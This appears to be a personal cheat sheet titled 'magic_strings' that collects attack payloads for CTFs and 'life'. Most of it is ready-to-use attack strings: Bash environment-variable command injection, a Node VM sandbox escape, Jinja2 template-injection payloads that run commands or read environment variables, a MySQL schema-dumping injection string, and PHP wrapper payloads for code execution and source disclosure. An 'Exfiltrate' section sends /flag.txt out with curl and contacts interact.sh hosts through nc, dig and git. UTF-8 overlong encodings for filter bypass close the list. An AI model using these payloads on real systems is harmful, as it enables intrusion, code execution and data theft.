# magic_strings
Handy bits for CTFs and life

### Bash 

#### ENV Vars
    BASH_ENV='$(id 1>&2)' bash -c 'echo hello'

    env $'BASH_FUNC_myfunc%%=() { id; }' bash -c 'myfunc'

#### Encoding

    $'\151\144'

### NodeJS

#### Node VM

Escape Node VM Sandbox

    this.constructor.constructor("return this.process")().mainModule.require("child_process").execSync("id").toString()

### Python

#### Jinja2 / Template Injection

    {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
    {{config.__class__.__init__.__globals__['os'].environ}}

### MySQL 

MySQL >=5.6

    concat(0x404f73616e64614d616c6974680a, @@innodb_version ,0x0a,user(),0x0a, schema(), (select (@x) from (select (@x:=0x00), (@number:=0),(select (0) from (mysql.innodb_table_stats) where (@x:=concat(@x,0x0a,lpad(@number:=@number+1,2,0),0x2e20,database_name, 0x202d3e20 ,table_name,0x202d3e20 ,length(table_name)))))x))

### PHP

    data://data:text/plain,<?php system("id")?>
    
    php://filter/convert.base64-encode/resource=index.php

### Exfiltrate

    curl -T /flag.txt xxxx.interct.sh
    ping here.xxx.interact.sh
    nc nchere.xxx.interact.sh 80
    dig dighere.xxx.interact.sh
    git clone githere.xxx.interact.sh
    
### Bypass

#### utf8 encoding

  " 	%C0%A2 	%E0%80%A2 	%F0%80%80%A2 	Double quote 	
  ' 	%C0%A7 	%E0%80%A7 	%F0%80%80%A7 	Single quote 	
  < 	%C0%BC 	%E0%80%BC 	%F0%80%80%BC 	Less-than sign 	
  > 	%C0%BE 	%E0%80%BE 	%F0%80%80%BE 	Greater-than sign 	
  . 	%c0%2e %C0%AE 	%E0%80%AE 	%F0%80%80%AE 	Full stop 	
  / 	%c0%2f %C0%AF 	%E0%80%AF 	%F0%80%80%AF 	Solidus 	
  \ 	%c0%5c %C1%9C %c0%80%5c %E0%81%9C 	%F0%80%81%9C 	Reverse solidus

## Resources

- [Payloads All The Things]( https://github.com/swisskyrepo/PayloadsAllTheThings/ )
- [Reverse Shells Generator]( https://www.revshells.com/ )
- [De Obfuscate JS]( https://lelinhtinh.github.io/de4js/ )
- [XSS Cheat sheet]( https://portswigger.net/web-security/cross-site-scripting/cheat-sheet )
- [HackTricks]( https://book.hacktricks.xyz )
- [Compile Online]( https://rextester.com/ )
